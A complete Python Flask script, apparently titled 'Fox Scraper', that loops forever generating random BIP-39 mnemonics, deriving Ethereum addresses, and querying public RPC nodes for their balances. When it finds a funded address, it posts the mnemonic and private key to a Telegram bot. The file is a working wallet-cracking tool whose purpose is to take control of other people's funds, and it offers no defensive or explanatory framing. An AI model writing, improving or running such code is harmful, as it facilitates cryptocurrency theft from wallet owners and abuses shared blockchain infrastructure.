import os
import threading
import time
import random
import requests
from flask import Flask
from mnemonic import Mnemonic
from eth_account import Account

# Initialize
Account.enable_unaudited_hdwallet_features()
app = Flask(__name__)

# CONFIG
RPC_URLS = [
    "https://eth.llamarpc.com",
    "https://cloudflare-eth.com",
    "https://rpc.ankr.com/eth",
    "https://eth-mainnet.public.blastapi.io"
]

# Credentials from Environment Variables
TG_TOKEN = os.environ.get("TELEGRAM_TOKEN")
TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

stats = {"checked": 0, "hits": 0, "status": "Initializing"}

def send_tg_message(text):
    """Utility to push alerts to your phone."""
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

def scraper_worker():
    mnemo = Mnemonic("english")
    stats["status"] = "Running"
    
    # Send startup confirmation
    send_tg_message("🦊 **Fox Scraper is Online**\nMonitoring the haystack...")
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})

    while True:
        try:
            # 1. Generate & Derive
            phrase = mnemo.to_mnemonic(os.urandom(16))
            acc = Account.from_mnemonic(phrase)
            address = acc.address
            
            # 2. Check
            rpc = random.choice(RPC_URLS)
            payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
            
            response = session.post(rpc, json=payload, timeout=5)
            if response.status_code == 200:
                res_json = response.json()
                balance_wei = int(res_json.get('result', '0x0'), 16)
                
                if balance_wei > 0:
                    eth_val = balance_wei / 10**18
                    stats["hits"] += 1
                    
                    # THE ALERT
                    alert = (
                        f"💰 **JACKPOT FOUND**\n\n"
                        f"**Balance:** `{eth_val} ETH`\n"
                        f"**Address:** `{address}`\n"
                        f"**Mnemonic:** `{phrase}`\n"
                        f"**Key:** `{acc.key.hex()}`"
                    )
                    send_tg_message(alert)
                
                stats["checked"] += 1
            elif response.status_code == 429:
                time.sleep(15) # Back off if throttled
                
        except Exception:
            time.sleep(1)
            continue

@app.route('/')
def home():
    return {
        "scraper_status": stats["status"],
        "total_scanned": stats["checked"],
        "hits": stats["hits"],
        "rpc_nodes": len(RPC_URLS)
    }

if __name__ == "__main__":
    threading.Thread(target=scraper_worker, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
